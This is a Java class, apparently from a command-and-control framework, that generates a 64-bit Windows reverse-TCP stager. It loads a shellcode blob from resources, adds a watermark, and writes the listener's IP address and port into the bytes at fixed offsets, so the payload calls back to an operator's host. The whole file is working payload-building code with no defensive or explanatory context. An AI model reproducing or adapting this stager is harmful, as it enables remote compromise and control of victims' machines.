package stagers;

import common.CommonUtils;
import common.Listener;
import common.Packer;
import graph.Route;

public class ForeignReverseStagerX64
        extends GenericStager {
    public ForeignReverseStagerX64(Listener l) {
        super(l);
    }

    @Override
    public String arch() {
        return "x64";
    }

    @Override
    public String payload() {
        return "windows/foreign/reverse_tcp";
    }

    @Override
    public byte[] generate() {
        String data = CommonUtils.bString(CommonUtils.readResource("resources/reverse64.bin")) + this.getConfig().getWatermark();
        long myhost = Route.ipToLong(this.getListener().getHost());
        Packer packer = new Packer();
        packer.addInt((int) myhost);
        data = CommonUtils.replaceAt(data, CommonUtils.bString(packer.getBytes()), 242);
        packer = new Packer();
        packer.addShort(this.getListener().getPort());
        data = CommonUtils.replaceAt(data, CommonUtils.bString(packer.getBytes()), 240);
        return CommonUtils.toBytes(data);
    }
}

